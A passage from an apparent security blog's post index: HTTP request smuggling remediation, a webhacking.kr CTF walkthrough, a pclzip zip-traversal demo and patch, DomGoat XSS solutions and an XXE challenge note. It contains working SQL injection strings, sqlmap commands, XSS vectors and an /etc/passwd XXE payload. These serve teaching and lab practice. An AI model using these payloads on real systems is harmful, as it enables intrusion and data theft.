Transfer-Encoding header. As such, the backend will process the request and will end at the character 0. As a result, the 404 GET request gets treated as a separate pipelined request.This issue occurs because the frontend prioritizes the Content-Length over Transfer-Encoding header. According to RFC 7230 Section 3.3.3#3, if a message with both Content-Length and Transfer-Encoding is accepted, the Transfer-Encoding header overrides the Content-Length. This is not followed by the frontend.In cases where the frontend might prioritize the Transfer-Encoding header, it might be possible to bypass this limitation by inserting a malformed transfer encoding header instead of a valid one. Some examples of this can be seen below:Transfer-Encoding : chunkedtRANSFER-ENCODING: chunkedTransfer-Encoding: chunkNumerous HTTP libraries tolerate different variations of the Transfer-Encoding header and will normalize them to improve client experience. As such, by understanding what variations of the Transfer-Encoding header is normalized by the backend server, it might be possible to smuggle a malformed Transfer-Encoding header through the frontend and conduct a CL:TE smuggling attack.The examples above just demonstrate the vulnerability. In a real attack scenario, a smuggled request can be crafted to conduct phishing attacks, or steal data from a victim’s request and send that to an attacker-controlled server.Scope and misconceptionsDuring this research, Snyk identified numerous cases where the obvious complexity of the multiple attack vectors led to misconceptions about HTTP request smuggling being reported to open source maintainers by researchers and maintainers, not always understanding if the criteria of remediation are in the scope of their maintained library or if it should be dealt with a dependency they are using as part of their library.Some of the challenges which required further clarification are as follows:      (1.) Proxies/Load Balancers and other mediums, that can be categorized as frontend, are most affected by this vulnerability. However, a successful request smuggling attack requires the exploitation of both a vulnerable frontend and a backend.        (2.) The responsibility of remediation falls onto a backend maintainer as much as a frontend maintainer. One can argue that normalizing malformed headers should be acceptable behavior from a backend and make it more tolerant to user faults, and that the real problem is proxies which forward these requests without normalizing them first. But due to the vast ecosystem of dependencies and numerous libraries fitting the criteria of a backend and frontend, it is ideal for both parties to try and remediate this issue.        (3.) Middlewares, web servers that support reverse proxy capabilities, WSGI/High-Performance servers are considered to fit the backend criteria, not a web server that just supports the processing of malformed requests but doesn’t support pipelining.        (4.) Security reports are often disclosed to maintainers as HTTP request smuggling issues due to servers responding to multiple requests sent and this being visible as two separate responses. It should be noted that many servers support Keep-Alive and pipelining—this by itself does not make an HTTP request smuggling vulnerability. This is the case in CVE-2020-12440 reported for NGINX.  RemediationHTTP request smuggling issues occur due to deviations from the current HTTP specifications and multiple libraries not following RFC7230. Furthermore, remediation of this vulnerability can be tricky depending on whether you are a frontend or backend project maintainer. As such, Snyk has researched the remediation implemented by open source projects currently and categorized it as follows. To simplify, all remediation points are covered along with reasoning to which smuggling attack type this will remediate against. In an ideal scenario, all of the points mentioned below should be used to provide a Defense-in-Depth approach solution.Prioritize Transfer-Encoding over Content-LengthRemediation: This remediation will prevent CL:TE and TE:CL attacksScope: Frontend, BackendDetails: When a request with both a Transfer-Encoding: chunked header and Content-length is received, the transfer-encoding header should be prioritized over Content-Length. This is referenced in RFC 7230 Section 3.3.3#3.Disallow requests with both Content-length and Transfer encoding and double Content-Length headersRemediation: This remediation will prevent CL:CL, CL:TE and TE:CL attacksScope: Backend, Frontend, Backend, Upstream librariesDetails: This can be seen as a better alternative to “Prioritize Transfer-Encoding over Content-Length” solution. Runtime platforms such as Node.js have used this solution to remediate against request smuggling where any requests with both headers are returned with an HTTP 400 response.Snyk believes this technique to be an ideal fix to prevent smuggling issues. However, considerations should be taken on how the fix is applied; especially if the fix is applied to a low-level HTTP library or an upstream engine numerous packages, such as a frontend, depend upon.When remediation HTTP request smuggling issues, RFC 7230 #3.3.3 should be followed. Section 3.3.3#3 in RFC 7230 states:“If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.”However, this is different from what is stated within RFC 2616 4.4#3:“If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.”It should be noted that RFC 2616 4.4#3 is obsolete and has been replaced by RFC 7230. RFC 7230 should be taken into consideration when implementing a fix. As such, when processing HTTP requests with both a Content-Length and Transfer encoding header, the correct behavior here is that the frontend should strip out the Content-length header before forwarding the request to a downstream backend, not return an HTTP 400 response header. The same should be done to requests with multiple Content-Length headers as stated in RFC 7230#3.3.2.As mentioned in RFC 7230 Section 3.3.2, if an HTTP request is received with multiple Content-Length headers with different length values, this can be remediated with an HTTP 400 response, or the duplicated field-values should be replaced with a single valid Content-Length field. Snyk recommends that low-level HTTP libraries opt to replace multiple headers with a single valid header.Disallow malformed Transfer-Encoding headers and correct Processing of Multiple TE valuesRemediation: This remediation will prevent TE:TE attacks.Scope: Frontend, BackendDetails: If both a frontend and backend prioritizes the Transfer-Encoding header, it could allow smuggling attacks where an attacker inserts two Transfer-Encoding headers, one which would be ignored by the frontend and is processed by the backend and vice versa. As such, the following type of header variations should be rejected.            TE header variation      Details                  Transfer-Encoding: chunked      Spaces before the “chunked” value are removed.              Transfer-Encoding : chunked      The header contains extra spaces. This is in violation of RFC 7230.              Transfer-Encoding: chunked      Trailing characters before the header.              Transfer-Encoding: chunk      The value “chunk” is provided which gets. Normalized by the server and is treated as chunked encoding.              Transfer-Encoding: chunked      Multiple spaces before the “chunked” value”.              Transfer-Encoding: “chunked”      The header value is provided inside double quotes which get normalized. Single quotes should also be taken into consideration.              Transfer-Encoding: chunked      CRLF characters are provided before the “chunked” value.              Transfer-Encoding: xchunked      The invalid character “x” will be removed by the backend server. Considerations should also be taken into account for unicode values provided before “chunked”. Other examples include “ch-nked”.      However, it should be noted that it’s still possible for attackers to find a malformed header variation of “chunked” encoding that is not documented above. As such, this alone should not be taken into account for remediation. A better approach would be to disallow requests with both Content-Length and Transfer-Encoding, along with disallowing malformed headers.Lastly, It should also be noted that if the “chunked” value is specified with other Transfer-Encoding values such as “gzip” or “deflate”, it shouldn’t be overlooked and Transfer-Encoding should be prioritized over Content-Length. An example of this vulnerability occurring can be seen in CVE-2019-16786. If an HTTP request is sent with the following Transfer-Encoding values, the “chunked” value should be correctly identified and prioritized:Transfer-Encoding: gzip, chunkedWithin a Transfer-Encoding header, several values can be listed separated by a comma. However, there might be cases where a frontend might only identify the “gzip” value and as such will prioritize the Content-Length header, and the backend might process this as a chunked request resulting in a CL:TE attack. Snyk recommends, whenever multiple values are specified that they are checked correctly and, if “chunked” is specified, then Transfer-Encoding be prioritized. Furthermore, if multiple transfer encoding headers are specified, the “chunked” value should only be present as the last value after other transfer encoding values are specified. This is stated in RFC 7230 Section 3.3.1.Wrapping upTo conclude, HTTP request smuggling can be a confusing vulnerability to understand and patch against. This blog hopes to help maintainers write efficient patches and secure their open source projects.It is also worth noting that this blog post only covers two techniques of HTTP request smuggling and does not provide detailed information regarding different exploitation scenarios. The following article from Security researcher ZeddYu has covered HTTP request smuggling extensively and has provided in-depth details regarding each attack smuggling vector: Zeddy Yu:Help you understand HTTP Smuggling in one article."
  },
  
  {
    "title": "Webhacking.kr Solutions",
    "url": "/posts/04_webhacking_kr_solutions/",
    "categories": "ctf",
    "tags": "webhacking.kr solutions",
    "date": "2020-04-04 03:25:52 +0800",
    





    
    "snippet": "This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend.Level 1The following can be seen in level 1.The source code of the backend applicat...",
    "content": "This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend.Level 1The following can be seen in level 1.The source code of the backend application can be read by clicking the view source button.A cookie called user_lv is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the solve function can be triggered.This function can be triggered by sending a value such as 5.5 which is smaller than 6 and is higher than 5.GET /challenge/web-01/ HTTP/1.1Host: webhacking.krUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateReferer: https://webhacking.kr/old.phpConnection: closeCookie: user_lv=5.5; PHPSESSID=qksuhplclrtd25armt59rkatn6Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Level 2The following can be seen in the HTML markup of the level 2 page.Looking at the response, a cookie named time is being set which reflects the date and time value show in the above HTML comment.The presence of SQL Injection can be discovered by trying a query such as 1604695706 AND 1=1 which returns true returns the following data: 2070-01-01 09:00:01, and 1604695706 AND 1=2 which returns 2070-01-01 09:00:00.Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL sleep function is triggered for 5 seconds. An example of this can be seen below.1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;48),SLEEP(5),7678)The same technique can be used to iterate through and extract more data.SQLMap can be used to automate this process.sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'To get the current database the application is running under, the ` –current-db` option can be used which reveals the current database to be ‘chall2’.SQLMap can then be used to get the tables belonging to this database.sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --tableDatabase: chall2[2 tables]+---------------+| admin_area_pw || log           |+---------------+The --dump option can be used to extract the password.This can be used to complete challenge 2.Level 3Level 3 presents a Nonogram/Sudoku puzzle. This can be read as follows: Horizontally, the last line has 5 black colors, second to last 2 colors etc etc. An example of this can be seen below:After multiple tries, this was found to be the correct answer.You are then presented with the following form.A hidden parameter exists which is vulnerable to SQL injection, this can be exploited as follows.POST /challenge/web-03/index.php HTTP/1.1Host: webhacking.krUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 38Origin: https://webhacking.krConnection: closeReferer: https://webhacking.kr/challenge/web-03/index.php?_1=1&amp;_2=0&amp;_3=1&amp;_4=0&amp;_5=1&amp;_6=0&amp;_7=0&amp;_8=0&amp;_9=0&amp;_10=0&amp;_11=0&amp;_12=1&amp;_13=1&amp;_14=1&amp;_15=0&amp;_16=0&amp;_17=1&amp;_18=0&amp;_19=1&amp;_20=0&amp;_21=1&amp;_22=1&amp;_23=1&amp;_24=1&amp;_25=1&amp;_answer=1010100000011100101011111Cookie: PHPSESSID=qksuhplclrtd25armt59rkatn6Upgrade-Insecure-Requests: 1answer='+OR+'1'='1&amp;id=SSLevel 4The following code is presented for Level 4. &lt;?php  include \"../../config.php\";  if($_GET['view-source'] == 1) view_source();?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Challenge 4&lt;/title&gt;&lt;style type=\"text/css\"&gt;body { background:black; color:white; font-size:9pt; }table { color:white; font-size:10pt; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;?php  sleep(1); // anti brute force  if((isset($_SESSION['chall4'])) &amp;&amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);  $hash = rand(10000000,99999999).\"salt_for_you\";  $_SESSION['chall4'] = $hash;  for($i=0;$i&lt;500;$i++) $hash = sha1($hash);?&gt;&lt;br&gt;&lt;form method=post&gt;&lt;table border=0 align=center cellpadding=10&gt;&lt;tr&gt;&lt;td colspan=3 style=background:silver;color:green;&gt;&lt;b&gt;&lt;?=$hash?&gt;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=center&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input name=key type=text size=30&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;a href=?view-source=1&gt;[view-source]&lt;/a&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;The above PHP code takes a number between 10000000 and 99999999 and merges it with salt_for_you. This value is then encrypted 500 times with the sha1 hashing algorithm."
  },
  
  {
    "title": "Patching Zip Traversal within pclzip",
    "url": "/posts/10_patching_zip_traversal_pclzip/",
    "categories": "software security",
    "tags": "zip slip",
    "date": "2020-03-02 03:25:52 +0800",
    





    
    "snippet": "Recently I went hunting for Zip traversal vulnerabilities within the PHP ecosystem. While looking at well known PHP ZIP dependencies, I noticed that, both pclzip and zipper were vulnerable to trave...",
    "content": "Recently I went hunting for Zip traversal vulnerabilities within the PHP ecosystem. While looking at well known PHP ZIP dependencies, I noticed that, both pclzip and zipper were vulnerable to traversal attacks.For Zipper, I was able to verify, write a patch and contact maintainers of zipper and modern zipper forks to push a new release. Details regarding that can be found below.  https://snyk.io/vuln/SNYK-PHP-CHUMPERZIPPER-552162  https://snyk.io/vuln/SNYK-PHP-DARIUSIIIZIPPER-552163  https://snyk.io/vuln/SNYK-PHP-MADNESTMADZIPPER-552164This short blog post will try to explain how to patch this issue manually within pclzip.ZIP Path TraversalZip Path Traversal is a vulnerability where it is possible to traversal directories of a program during archive/zip extraction due to insufficient validation of user provided filenames. By leveraging this vulnerability, it is often possible to conduct arbitrary file writes within a vulnerable system, which can lead to arbitrary code execution.This vulnerability has existed over a decade and some good research around this can be found below:  http://phrack.org/issues/34/5.html#article  https://snyk.io/research/zip-slip-vulnerability  https://www.youtube.com/watch?v=Ry_yb5Oipq0pclzip VulnerabilityThis library has existed since 2009 and is extremely popular within the PHP ecosystem. Content Management systems such as WordPress and Joola currently use a forked version of pclzip within their software.pclzip within its default state is vulnerable to ZIP traversal attacks, and due to its poor outdated documentation and badly written classes, it is extremely hard to understand how to mitigate against this issue.Eventhough this package now exists within packagist, its original maintainer is now where to be found and multiple forks of this module exists within GitHub: https://github.com/search?q=pclzipVerifying ZIP TraversalTo test if the vulnerability, start by creating two different files and creating a ZIP archive with them as follows.snoopy@snoopy-XPS-15-9570:~/ziptest/poc$ echo foo &gt; test1.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ echo bar &gt; xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ lstest1.txt  xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ zip -r ziptest.zip test1.txt xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txt   adding: test1.txt (stored 0%)  adding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txt (stored 0%)snoopy@snoopy-XPS-15-9570:~/ziptest/poc$ This ZIP can then be opened using a HEX editor and the test2 filename can be edited to be something such as ../../../../../../../../tmp/test2.txt.his can then be provided to the below example usage code.The following code demonstrates usage of PclZIp, The below code will open a ZIP file and extract its contents to a given location.&lt;?phprequire __DIR__ . '/vendor/autoload.php';$zip = new PclZip('/home/snoopy/ziptest/poc/ziptest.zip');$zip-&gt;extract(PCLZIP_OPT_PATH, '/home/snoopy/ziptest/uploads');Once executed, this will then extract both files. the test2 file has successfully extracted to the tmp directory.snoopy@snoopy-XPS-15-9570:/tmp$ cat test2.txt barsnoopy@snoopy-XPS-15-9570:/tmp$ When looking for these vulnerabilities in the wild, the following can also be useful.  https://github.com/ptoomey3/evilarc  https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/fileformat/zip_slip.rb  https://github.com/snyk/zip-slip-vulnerability/tree/master/archivesPCLZIP_OPT_EXTRACT_DIR_RESTRICTION FeatureAccording to version 2.5 notes (https://github.com/ivanlanin/pclzip), this version introduced the PCLZIP_OPT_EXTRACT_DIR_RESTRICTION feature.PclZip can extract any file in any folder of a system. People may use this to upload a zip file and try to override a system file. The PCLZIP_OPT_EXTRACT_DIR_RESTRICTION will give the ability to forgive any directory transversal behavior.However, this option seems to be lacking documentation. Furthermore, this functionality seems to not work if an absolute path is specified via PCLZIP_OPT_PATH. This seems to be a problem for multiple maintainers using this package https://github.com/matomo-org/matomo/issues/1812.Patching ManuallyAn easy way to fix this feature would be to patch this yourself within the library. Within the pclzip.lib.php itself, When the extract() function is initially called within the library, this will parse the given arguments and set the necessary options. privExtractByRule() function is then executed. This function will extract a file or directory depending on arguments initially provided e.g. by index, by name etc. Within this loaded function, the $p_file_list argument is the array which contains all the properties of the zip file, including the filenames.Within this function, the privExtractFile function is then called (https://github.com/ivanlanin/pclzip/blob/master/pclzip.lib.php#L3424). This function actually does the extraction.Inside this function, it is possible to validate the filename arguments, and based on the rewrite them to remove malicious characters.The following code can be inserted here: https://github.com/ivanlanin/pclzip/blob/master/pclzip.lib.php#L3514        if (strpos($p_entry['stored_filename'], '../') !== false || strpos($p_entry['stored_filename'], '..\\\\') !== false) {            $p_entry['stored_filename'] = basename($p_entry['stored_filename']);            $p_entry['filename'] = basename($p_entry['stored_filename']);            echo $p_entry['stored_filename'];During extraction, the above code will check if the [‘stored_filename’] array value contains .. characters, and if so, will extract the basename of the parameter removing the special characters. E.g. ../../../tmp/foo.txt becomes foo.txt. Then, extraction will continue as normal."
  },
  
  {
    "title": "DomGoat Walkthrough",
    "url": "/posts/08_domgoat_solutions/",
    "categories": "web application security",
    "tags": "domgoat",
    "date": "2020-02-09 03:25:52 +0800",
    





    
    "snippet": "DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This could be abused by an attacker to manipulat...",
    "content": "DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This could be abused by an attacker to manipulate this data to include malicious JavaScript code.Domgoat has 10 exercises of Dom XSS. Some examples where user input come from are location.href,document.URL, document.baseURI etc leading to a sink function such as document.write, document.writeln, innerHTML etc.A detailed explanation of DOM sources can be found here: Client XSS Sources  URL-based DOM Property Sources - `location.href, document.URL etc  Navigation-based DOM Property Sources - window.name, document.referrer`  Communication based Sources - `Window Messaging, WebSocket  Storage-based Sources - SessionStorage, LocalStorage`A detailed explanation of DOM sinks can be found here: Client XSS Sinks  Sinks that execute payload as JavaScript - eval, setTimeout, setInterval  Sinks that evaluate JavaScript URIs - location, location.href, location.assign  Sinks that execute payload as HTML - innerHTML, outerHTML, document.write, document.writelnThis blog will share solutions for DomGoat, a DOM XSS challenge bed.Exercise - 1    let hash = location.hash;    if (hash.length &gt; 1) {        let hashValueToUse = unescape(hash.substr(1));        let msg = \"Welcome &lt;b&gt;\" + hashValueToUse + \"&lt;/b&gt;!!\";        document.getElementById(\"msgboard\").innerHTML = msg;    }The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.&lt;object/onerror=alert(document.domain)&gt;https://domgo.at/cxss/example/1?payload=abcd&amp;sp=x#%3Cobject/onerror=alert(document.domain)%3EExercise - 2 let rfr = document.referrer;    let paramValue = unescape(getPayloadParamValueFromUrl(rfr));    if (paramValue.length &gt; 0) {        let msg = \"Welcome &lt;b&gt;\" + paramValue + \"&lt;/b&gt;!!\";        document.getElementById(\"msgboard\").innerHTML = msg;    } else {        document.getElementById(\"msgboard\").innerHTML = \"Parameter named &lt;b&gt;payload&lt;/b&gt; was not found in the referrer.\";    }The source where user input is flowing from is document.referrer and the sink where user input ends up is HTMLElement.innerHTML.Looking at the above JavaScript code, the document.referrer is sent the the getPayloadParamValueFromUrl function.This function is looking for a parameter called payload is returning that to the msg variable which is then given to innerHTML.let getPayloadParamValueFromUrl = function (url) {let paramName = \"payload=\";if (url.indexOf(paramName) &gt; -1) { //check for value payload    let part = url.substr(rfr.indexOf(paramName));    part = part.split(paramName)[1]; //extract payload parameter value    if (part.indexOf(\"#\") &gt; -1) {  //check for hash sign within the value        part = part.split(\"#\")[0]; \t//extract the hash value            }    part = part.split(\"&amp;\")[0];\t\tdocument.write(part.split(\"&amp;\")[0]);    return part;}return \"\";};The same payload from Exercise 1 can be used. Here Exercise 1 page is first visited.https://domgo.at/cxss/example/1?payload=abcd%3Cobject/onerror=alert(window.location.pathname)%3E&amp;sp=x#11The Exercise 2 page can now be visited to execute XSS.Exercise - 3    let responseBody = xhr.responseText;    let responeBodyObject = JSON.parse(responseBody);    let msg = \"Welcome &lt;b&gt;\" + responeBodyObject.payload + \"&lt;/b&gt;!!\";    document.getElementById(\"msgboard\").innerHTML = msg;The source where user input is flowing from is xhr.responseText; and the sink where user input ends up is HTMLElement.innerHTML.Here a input form is provided to insert some user input, this is then sent to the following endpoint        xhr.open(\"GET\", '/data.json?payload=' + escape(payload), true);        xhr.send();This is then returned innerHTML.A payload such as the following can be inserted into the payload box.&lt;iframe/onload=alert(window.location.pathname)&gt;Exercise - 4  let ws = new WebSocket(webSocketUrl);    ws.onmessage = function (evt) {                let rawMsg = evt.data;        let msgJson = JSON.parse(rawMsg);        let msg = \"Welcome &lt;b&gt;\" + msgJson.payload + \"&lt;/b&gt;!!\";        document.getElementById(\"msgboard\").innerHTML = msg;    };The source where user input is flowing from is ws.onmessage and the sink where user input ends up is HTMLElement.innerHTML.Looking at the HTML source, user input from the payloadbox input form is sent to a /ws endpoint      let payload = document.getElementById('payloadbox').value;        ws.send(payload);This is then returned to HTML.&lt;iframe/onload=alert(window.location.pathname)&gt;Exercise - 5    window.onmessage = function (evt) {        let msgObj = evt.data;        let msg = \"Welcome &lt;b&gt;\" + msgObj.payload + \"&lt;/b&gt;!!\";        document.getElementById(\"msgboard\").innerHTML = msg;    };The source where user input is flowing from is postMessage and the sink where user input ends up is HTMLElement.innerHTML.In the below code, the window.postMessage() method is used to send a request to a window object and this data is printed back to the msgboard.   window.onload = function () {        processPayload();    };    let processPayload = function () {        let payload = document.getElementById('payloadbox').value;        frames[0].postMessage(payload, location.origin);The following can be inserted to the payloadbox.&lt;iframe/onload=alert(window.location.pathname)&gt;Exercise - 6    let payloadValue = localStorage.getItem(\"payload\", payload);    let msg = \"Welcome \" + payload + \"!!\";    document.getElementById(\"msgboard\").innerHTML = msg;The source where user input is flowing from is localStorage.getItem and the sink where user input ends up is HTMLElement.innerHTML.Any user input inserted into the payloadbox is stored within the browser’s local storage.   let processPayload = function () {        let payload = document.getElementById('payloadbox').value;        localStorage.setItem(\"payload\", payload);        readPayload();    };This is then reflected back in a user’s page.&lt;svg/onload=alert(window.location.pathname)&gt;Exercise - 7   let hash = location.hash;    let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;    hashValueToUse = hashValueToUse.replace(/&lt;/g, \"&amp;lt;\").replace(/&gt;/g, \"&amp;gt;\");    let msg = \"&lt;a href='#user=\" + hashValueToUse + \"'&gt;Welcome&lt;/a&gt;!!\";    document.getElementById(\"msgboard\").innerHTML = msg;The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.The user input here is concentated as part of a href link &lt;a href='#user=\" + hashValueToUse + \"'&gt;Welcome&lt;/a&gt;. In is possible to break out of this attribute context using another JavaScript event handler.#' onmouseover=alert(window.location.pathname)//https://domgo.at/cxss/example/7#%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2FExercise - 8    let hash = location.hash;    let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;    if (hashValueToUse.indexOf(\"=\") &gt; -1 ) {        hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf(\"=\")+1);        hashValueToUse = hashValueToUse.replace(/&lt;/g, \"&amp;lt;\").replace(/&gt;/g, \"&amp;gt;\");        let msg = \"&lt;a href='#user=\" + hashValueToUse + \"'&gt;Welcome&lt;/a&gt;!!\";        document.getElementById(\"msgboard\").innerHTML = msg;    }The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.Here from the location.hash value, the = sign is check to be present through hashValueToUse.indexOf(“=”)+1 and everything after this is extracted. Any greater than or less than sign is also converted to HTML entities.#' onmouseover=alert(window.location.pathname)//https://domgo.at/cxss/example/8#=%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2FExercise - 9   let hash = location.hash;    let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;    if (hashValueToUse.indexOf(\"=\") &gt; -1 ) {                hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf(\"=\") + 1);                if (hashValueToUse.length &gt; 1) {            hashValueToUse = hashValueToUse.substr(0, 10);            hashValueToUse = hashValueToUse.replace(/\"/g, \"&amp;quot;\");            let windowValueToUse = window.name.replace(/\"/g, \"&amp;quot;\");            let msg = \"&lt;a href=\\\"\" + hashValueToUse + windowValueToUse + \"\\\"&gt;Welcome&lt;/a&gt;!!\";            document.getElementById(\"msgboard\").innerHTML = msg;        }    }The source where user input is flowing from is location.hash as part of window.name and the sink where user input ends up is HTMLElement.innerHTML.The Window.name property gets/sets the name of the window’s browsing context. The location.hash value of this window is then reflected back to the user. This can be emulated by creating a new webpage somewhere with the following JavaScript code.&lt;html&gt;&lt;script&gt;window.open('https://domgo.at/cxss/example/9#user=javascript', ':alert(window.location.pathname)');&lt;/script&gt;&lt;/html&gt;When openedm this will open a new window with the user parameter being javascript and the window.name being :alert(window.location.pathname).The “Welcome” link can be clicked to execute JavaScript.Exercise - 10   let urlParts = location.href.split(\"?\");    if (urlParts.length &gt; 1) {                let queryString = urlParts[1];        let queryParts = queryString.split(\"&amp;\");        let userId = \"\";        for (let i = 0; i &lt; queryParts.length; i++) {                        let keyVal = queryParts[i].split(\"=\");            if (keyVal.length &gt; 1) {                if (keyVal[0] === \"user\") {                                        userId = keyVal[1];                    break;                }            }        }        if (userId.startsWith(\"ID-\")) {            userId = userId.substr(3, 10);            userId = userId.replace(/\"/g, \"&amp;quot;\");            let windowValueToUse = window.name.replace(/\"/g, \"&amp;quot;\");            let msg = \"&lt;a href=\\\"\" + userId + windowValueToUse + \"\\\"&gt;Welcome&lt;/a&gt;!!\";            document.getElementById(\"msgboard\").innerHTML = msg;        }    }The source where user input is flowing from is location.hash as part of window.name and the sink where user input ends up is HTMLElement.innerHTML.The value of the parameter user is extracted, this value is then checked to see if the value ID- is present. If so, the value after ID- is extracted, all double quotes are replaced within this parameter and the window.name property. this is then inserted as part of a href link: &lt;a href=\\\"\" + userId + windowValueToUse + \"\\\"&gt;Welcome&lt;/a&gt; which is served to innerHTML.&lt;script&gt;window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', ':alert(window.location.pathname)');&lt;/script&gt;"
  },
  
  {
    "title": "RipsTech Java Security Calendar 2019 Notes",
    "url": "/posts/ripstech-java-advent-calendar/",
    "categories": "capture the flag",
    "tags": "ctf",
    "date": "2020-01-08 03:25:52 +0800",
    





    
    "snippet": "Notes related to RipsTech PHP Security Calendar 2019 which aren’t accessible anymore.Challenge 1 - Candy Caneimport org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import...",
    "content": "Notes related to RipsTech PHP Security Calendar 2019 which aren’t accessible anymore.Challenge 1 - Candy Caneimport org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;public class ImportDocument {  // This function extracts the text of an OpenOffice document  public static String extractString() throws IOException, JDOMException {    File initialFile = new File(\"uploaded_office_doc.odt\");    InputStream in = new FileInputStream(initialFile);    final ZipInputStream zis = new ZipInputStream(in);    ZipEntry entry;    List&lt;Content&gt; content = null;    while ((entry = zis.getNextEntry()) != null) {      if (entry.getName().equals(\"content.xml\")) {        final SAXBuilder sax = new org.jdom2.input.SAXBuilder();        sax.setFeature(\"http://javax.xml.XMLConstants/feature/secure-processing\",true);        Document doc = sax.build(zis);        content = doc.getContent();        zis.close();        break;      }    }    StringBuilder sb = new StringBuilder();    if (content != null) {      for(Content item : content){        sb.append(item.getValue());      }    }    return sb.toString();  }}  The extractString function opens an OpenOffice document uploaded by an attacker to extract its text.  OpenOffice documents are ZIP files containing multiple resources.  One of these resources is content.xml, which holds the text information in XML format.  The file content.xml is processed by the method org.jdom2.input.SAXBuilder.build(), which is vulnerable to XXE injection.  The XXE vulnerability can be exploited by adding a malicious DOCTYPE declaration to the XML document.  The XXE entity can reference sensitive files, such as /etc/passwd, and insert their contents into the document.Example payload:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT text ANY &gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;Challenge 2 - Eggnog Madnessimport org.json.*;public class MainController{  private static String[] parseJsonAsArray(String rawJson, String field) {    JSONObject obj = new JSONObject(rawJson);    JSONArray arrJson = obj.getJSONArray(field);    String[] arr = new String[arrJson.length()];    for (int i = 0; i &lt; arrJson.length(); i++) {      arr[i] = arrJson.getString(i);    }    return arr;  }  private static String parseJsonAsString(String rawJson, String field) {    JSONObject obj = new JSONObject(rawJson);    return obj.getString(field);  }  // rawJson is user-controlled.  public MainController(String rawJson) {    this(parseJsonAsString(rawJson, \"controller\"), parseJsonAsString(rawJson, \"task\"), parseJsonAsArray(rawJson, \"data\"));  }  private MainController(String controllerName, String task, String... data) {    try {      Object controller = !controllerName.equals(\"MainController\") ? Class.forName(controllerName).getConstructor(String[].class).newInstance((Object) data) : this;      System.out.println(controller.getClass().getMethod(task));      controller.getClass().getMethod(task).invoke(controller);    } catch (Exception e1) {      try {        String log = \"# [ERROR] Exception with data: \" + data + \" with exception \" + e1;        System.err.println(log);        // DONE: VulnApp Security Bug #23517: Strip all \"dots\" so file extension does not lead to RCE        Runtime.getRuntime().exec(new String[]{\"java\", \"-jar\", \"log4j_custom_dlogger.jar\", log.replaceAll(\".\", \"\")});        // TODO: VulnApp Bug #24630: Logging is currently not working in v1.8,        //       something with an ArgumentException, please have alook at that @peter      } catch (Exception e2) {        System.err.println(\"FATAL 